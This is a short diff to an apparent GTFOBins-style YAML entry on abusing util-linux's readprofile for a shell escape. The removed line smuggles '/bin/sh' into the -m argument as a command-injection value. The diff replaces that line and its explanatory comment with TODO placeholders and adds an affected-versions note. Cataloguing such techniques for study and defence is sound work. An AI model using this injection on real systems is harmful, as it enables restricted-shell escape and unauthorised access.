@@ -4,10 +4,10 @@ functions:
   - code: |-
       TMPFILE=$(mktemp)
       echo "_stext" > $TMPFILE
-      readprofile -p $TMPFILE -m "-h; /bin/sh ; file.gz"
+      TODO
     comment: |-
-      The file containing the String "_stext" and passed with the -p flag is employed to suppress the error occurring when the default profile file /proc/profile is not present.
-      Affects util-linux versions TODO
+      TODO
+      Affects util-linux versions <= 2.42.2.
     contexts:
       unprivileged:
 ...
